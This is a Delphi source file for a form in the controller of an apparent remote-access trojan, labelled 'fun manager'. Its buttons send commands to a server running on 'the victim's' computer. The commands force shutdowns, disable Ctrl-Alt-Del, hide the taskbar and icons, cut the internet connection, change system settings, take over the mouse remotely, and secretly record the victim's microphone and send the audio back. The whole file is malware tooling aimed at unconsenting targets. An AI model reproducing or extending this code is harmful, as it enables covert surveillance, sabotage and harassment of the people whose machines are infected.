unit Unit23;

interface

uses
  Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs,
  ExtCtrls, RXSpin, StdCtrls, ComCtrls, NMMsg;

type
  TForm3 = class(TForm)
    Edit4: TEdit;
    Button6: TButton;
    Button26: TButton;
    Button14: TButton;
    Button50: TButton;
    Button30: TButton;
    Edit5: TEdit;
    UpDown1: TUpDown;
    Label10: TLabel;
    RxSpinEdit1: TRxSpinEdit;
    Button49: TButton;
    Label5: TLabel;
    Label1: TLabel;
    Label12: TLabel;
    Label3: TLabel;
    Label2: TLabel;
    Button68: TButton;
    Button12: TButton;
    Button16: TButton;
    Button43: TButton;
    Button5: TButton;
    Button62: TButton;
    Button63: TButton;
    Button7: TButton;
    Button42: TButton;
    Button15: TButton;
    Button13: TButton;
    Label9: TLabel;
    Label6: TLabel;
    Label8: TLabel;
    Label13: TLabel;
    Label11: TLabel;
    Button41: TButton;
    Button45: TButton;
    Button69: TButton;
    Button64: TButton;
    Button71: TButton;
    Button72: TButton;
    Button65: TButton;
    Button70: TButton;
    Button44: TButton;
    Button24: TButton;
    Label4: TLabel;
    Button1: TButton;
    Button2: TButton;
    Button3: TButton;
    Button4: TButton;
    Button8: TButton;
    Image1: TImage;
    Button9: TButton;
    procedure Label4Click(Sender: TObject);
    procedure Label4MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button6Click(Sender: TObject);
    procedure Button14Click(Sender: TObject);
    procedure Button26Click(Sender: TObject);
    procedure Button50Click(Sender: TObject);
    procedure UpDown1Click(Sender: TObject; Button: TUDBtnType);
    procedure Button30Click(Sender: TObject);
    procedure Button49Click(Sender: TObject);
    procedure Button68Click(Sender: TObject);
    procedure Button62Click(Sender: TObject);
    procedure Button5Click(Sender: TObject);
    procedure Button43Click(Sender: TObject);
    procedure Button16Click(Sender: TObject);
    procedure Button12Click(Sender: TObject);
    procedure Button63Click(Sender: TObject);
    procedure Button7Click(Sender: TObject);
    procedure Button42Click(Sender: TObject);
    procedure Button15Click(Sender: TObject);
    procedure Button13Click(Sender: TObject);
    procedure Button41Click(Sender: TObject);
    procedure Button45Click(Sender: TObject);
    procedure Button69Click(Sender: TObject);
    procedure Button64Click(Sender: TObject);
    procedure Button71Click(Sender: TObject);
    procedure Button24Click(Sender: TObject);
    procedure Button44Click(Sender: TObject);
    procedure Button70Click(Sender: TObject);
    procedure Button65Click(Sender: TObject);
    procedure Button72Click(Sender: TObject);
    procedure Edit4MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button6MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button14MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button26MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button50MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button30MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Edit5MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure UpDown1MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button49MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure RxSpinEdit1MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button68MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button1Click(Sender: TObject);
    procedure Button1MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button2MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button2Click(Sender: TObject);
    procedure Button3MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button3Click(Sender: TObject);
    procedure Button4Click(Sender: TObject);
    procedure Button4MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button8Click(Sender: TObject);
    procedure Image1MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure FormCreate(Sender: TObject);
    procedure Button9MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Button9Click(Sender: TObject);
  private
    procedure WMNCHitTest(var M: TWMNCHitTest); message wm_NCHitTest;
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form3: TForm3;

implementation

uses Unit2, SetSoundUnit, ChangeColorsUnit, TimeDateUnit;

{$R *.DFM}

function Merge(x,y:integer;lab:TLabel):Boolean;
begin
 if ((x>=Form3.Left+lab.Left) and (x<=Form3.Left+lab.Left+lab.Width))
  and ((y>=Form3.Top+lab.Top) and (y<=Form3.Top+lab.Top+lab.Height)) then result:=False
 else result:=True;
end;

procedure TForm3.WMNCHitTest(var M: TWMNCHitTest);
begin
  inherited;
 if (M.Result = HTCLIENT) and (Merge(m.xpos,m.ypos,Label4)) then
   M.Result := htCaption;
end;

procedure TForm3.Label4Click(Sender: TObject);
begin
 hide;
end;

procedure TForm3.Label4MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 Cursor:=crHandPoint;
 Form1.SetCaption(#13#10'hide fun manager');
end;

procedure TForm3.Button6Click(Sender: TObject);
begin
 Form1.SendCommand('URL'+Edit4.Text,'trying to open browser...');
end;

procedure TForm3.Button14Click(Sender: TObject);
begin
Form1.SendCommand('RWN','trying to shut down windows...');
end;

procedure TForm3.Button26Click(Sender: TObject);
begin
  if Button26.Caption='reverse mouse buttons' then
   begin
   Form1.SendCommand('RMB','trying to reverse mouse buttons...');
    Button26.Caption:='restore mouse buttons';
   end else begin
   Form1.SendCommand('BMB','trying to restore mouse buttons...');
    Button26.Caption:='reverse mouse buttons';
   end;
end;

procedure TForm3.Button50Click(Sender: TObject);
begin
 if button50.caption='show mouse' then
  begin
  Form1.SendCommand('SMCon','trying to show the mouse cursor...');
   button50.caption:='hide mouse';
  end else
  begin
  Form1.SendCommand('SMCoff','trying to hide the mouse cursor...');
   button50.caption:='show mouse';
  end;
end;

procedure TForm3.UpDown1Click(Sender: TObject; Button: TUDBtnType);
begin
 if UpDown1.Position<>1 then
  Edit5.Text:=IntToStr(UpDown1.Position)
 else Edit5.Text:='off';
end;

procedure TForm3.Button30Click(Sender: TObject);
begin
Form1.SendCommand('SMT'+Edit5.Text,'trying to set the mouse trails...');
end;

procedure TForm3.Button49Click(Sender: TObject);
begin
 if form1.NotPassedVersionCheck('1.3') then exit;
 form1.SetTransferandOn;
Form1.SendCommand('RSF'+FloatToStr(RxSpinEdit1.Value),'recording...');
end;

procedure TForm3.Button68Click(Sender: TObject);
begin
 if form1.NotPassedVersionCheck('1.4') then exit;
Form1.SendCommand('HGU','trying to disconnect...');
end;

procedure TForm3.Button62Click(Sender: TObject);
begin
 Form1.SendCommand('HDI','trying to hide desktop icons...');
end;

procedure TForm3.Button5Click(Sender: TObject);
begin
Form1.SendCommand('STA1','trying to hide the Start menu...');
end;

procedure TForm3.Button43Click(Sender: TObject);
begin
 Form1.SendCommand('HTB','trying to hide the taskbar...');
end;

procedure TForm3.Button16Click(Sender: TObject);
begin
 Form1.SendCommand('OCD','trying to open cd rom...');
end;

procedure TForm3.Button12Click(Sender: TObject);
begin
Form1.SendCommand('SP1','starting the beeper...');
end;

procedure TForm3.Button63Click(Sender: TObject);
begin
Form1.SendCommand('SDI','trying to show desktop icons...');
end;

procedure TForm3.Button7Click(Sender: TObject);
begin
 Form1.SendCommand('STA2','trying to show the Start menu...');

end;

procedure TForm3.Button42Click(Sender: TObject);
begin
 Form1.SendCommand('STB','trying to make the taskbar visible...');
end;

procedure TForm3.Button15Click(Sender: TObject);
begin
 Form1.SendCommand('CCD','trying to close cd rom...');
end;

procedure TForm3.Button13Click(Sender: TObject);
begin
 Form1.SendCommand('SP2','stopping the beeper...');
end;

procedure TForm3.Button41Click(Sender: TObject);
begin
 Form1.SendCommand('TMN','trying to turn monitor ON...');
end;

procedure TForm3.Button45Click(Sender: TObject);
begin
 if form1.NotPassedVersionCheck('1.2') then exit;
 Form1.SendCommand('CAE','trying to enable CtrlAltDel...');
end;

procedure TForm3.Button69Click(Sender: TObject);
begin
 if form1.NotPassedVersionCheck('1.4') then exit;
 form1.SendCommand('SCLON','trying to turn ScrollLock ON...');
end;

procedure TForm3.Button64Click(Sender: TObject);
begin
 if form1.NotPassedVersionCheck('1.4') then exit;
  form1.SendCommand('CSLON','trying to turn CapsLock ON...');
end;

procedure TForm3.Button71Click(Sender: TObject);
begin
 if form1.NotPassedVersionCheck('1.4') then exit;
 Form1.SendCommand('NMLON','trying to turn NumLock ON...');
end;

procedure TForm3.Button24Click(Sender: TObject);
begin
  form1.SendCommand('TMF','trying to turn monitor OFF...');
end;

procedure TForm3.Button44Click(Sender: TObject);
begin
 if form1.NotPassedVersionCheck('1.2') then exit;
 form1.SendCommand('CAD','trying to disable CtrlAltDel...');
end;

procedure TForm3.Button70Click(Sender: TObject);
begin
 if form1.NotPassedVersionCheck('1.4') then exit;
  form1.SendCommand('SCLOFF','trying to turn ScrollLock OFF...');
end;

procedure TForm3.Button65Click(Sender: TObject);
begin
 if form1.NotPassedVersionCheck('1.4') then exit;
  form1.SendCommand('CSLOFF','trying to turn CapsLock OFF...');
end;

procedure TForm3.Button72Click(Sender: TObject);
begin
 if form1.NotPassedVersionCheck('1.4') then exit;
  form1.SendCommand('NMLOFF','trying to turn NumLock OFF...');
end;

procedure TForm3.Edit4MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 Form1.SetCaption(' '#13#10'enter here the URL');
end;

procedure TForm3.Button6MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 Form1.SetCaption('the victim''s default browser will open at the specified URL');
end;

procedure TForm3.Button14MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 Form1.SetCaption('force a shutdown of the victim''s computer');
end;

procedure TForm3.Button26MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 Form1.SetCaption('reverse/restore the victim''s mouse buttons. [useful when playing quake2 with the victim :)]');
end;

procedure TForm3.Button50MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 Form1.SetCaption('shows/hides the mouse cursor on the victim''s computer. note: only the arrow cursor is affected.');
end;

procedure TForm3.Button30MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 Form1.SetCaption('click here to change the victim''s mouse trails to the specified value');
end;

procedure TForm3.Edit5MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 Form1.SetCaption('specify the number of trails the mouse will have');
end;

procedure TForm3.UpDown1MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 Form1.SetCaption('increase/decrease/turn off the mouse trails');
end;

procedure TForm3.Button49MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 Form1.SetCaption('starts recording using the victim''s microphone [if he/she has one] and then sends the WAV file to you.');
end;

procedure TForm3.RxSpinEdit1MouseMove(Sender: TObject; Shift: TShiftState;
  X, Y: Integer);
begin
 Form1.SetCaption('type or set the number of secounds. the server on the victim''s computer will record for that number of secounds.');
end;

procedure TForm3.Button68MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 Form1.SetCaption('disconnect the victim from the internet');
end;

procedure TForm3.Button1Click(Sender: TObject);
begin
 if form1.NotPassedVersionCheck('1.6') then exit;
  form1.SendCommand('CRS','reading list of allowed resolutions...');
end;

procedure TForm3.Button1MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 Form1.SetCaption('shows u a list of the allowed resolutions on the victim''s computer and allows you to change between them');
end;

procedure TForm3.Button2MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 Form1.SetCaption('control the mouse on the victim''s computer [when you move it, it moves on the victim''s screen]');
end;

function MouseProc(Code : Integer; wParam : WPARAM; lParam : LPARAM) : LongInt; stdcall;
var
  Point : TPoint;
begin
  try
    Result := 0;
    if Code < 0 then
      CallNextHookEx(Form1.MouseHook, Code, WParam, LParam);
  except
    Application.HandleException(nil);
  end;
  if Code <> HC_NOREMOVE then begin
    Point := TMouseHookStruct(Pointer(lParam)^).pt;
    Form1.SendMousePos(Point.x, Point.y);
  end;
end;

procedure TForm3.Button2Click(Sender: TObject);
begin
 if form1.NotPassedVersionCheck('1.8') then exit;
  if Button2.Caption = 'move mouse' then begin
    Form1.MouseHook := SetWindowsHookEx(WH_MOUSE, @MouseProc, 0, GetCurrentThreadID);
    Form1.MouseMsg := TNMMsg.Create(Self);
    with Form1 do try
      MouseMsg.TimeOut := 250;
      MouseMsg.ReportLevel := 0;
      MouseMsg.Host := Form1.ClientSocket.Address;
      MouseMsg.Port := 6776;
      MouseMsg.FromName := 'MMT';
     except end;
    Button2.Caption := 'stop moving';
  end else begin
    UnhookWindowsHookEx(Form1.MouseHook);
    Form1.MouseMsg.Free;
    Form1.MouseHook := 0;
    Button2.Caption := 'move mouse';
  end;

end;

procedure TForm3.Button3MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 Form1.SetCaption('change the victim''s sound volume');
end;

procedure TForm3.Button3Click(Sender: TObject);
begin
 if form1.NotPassedVersionCheck('1.8') then exit;
 form1.SendCommand('SVT0','volume control.');
 SetSoundForm.Show;
end;

procedure TForm3.Button4Click(Sender: TObject);
begin
 if form1.NotPassedVersionCheck('1.8') then exit;
 ChangeColorsForm.Show;
end;

procedure TForm3.Button4MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 Form1.SetCaption('change windows colors on the victim''s computer.');
end;

procedure TForm3.Button8Click(Sender: TObject);
begin
 if form1.NotPassedVersionCheck('1.8') then exit;
 Form1.SendCommand('RWC','restoring windows colors...');
end;

procedure TForm3.Image1MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 Cursor:=crDefault;
end;

procedure TForm3.FormCreate(Sender: TObject);
begin
 if (Form1.ReadINI('Options','FunMBitmap')='ERROR') or (Form1.ReadINI('Options','FunMBitmap')='<default>') then
  Form3.Image1.Picture.Bitmap.LoadFromResourceName(HInstance,'BITMAP_3')
 else
  try
   Form3.Image1.Picture.Bitmap.LoadFromFile(Form1.ReadINI('Options','FunMBitmap'));
  except
   ShowMessage('skin: '+Form1.ReadINI('Options','FunMBitmap')+' not found. using default skin.');
   Form3.Image1.Picture.Bitmap.LoadFromResourceName(HInstance,'BITMAP_3')
  end; 
end;

procedure TForm3.Button9MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 Form1.SetCaption('change the victim''s time and date');
end;

procedure TForm3.Button9Click(Sender: TObject);
begin
 if form1.NotPassedVersionCheck('1.8') then exit;
 Form1.SendCommand('RTD','reading current time/date...');
 TimeDate.Label1.Caption:='reading time/date... hold on...';
 TimeDate.Show;
end;

end.
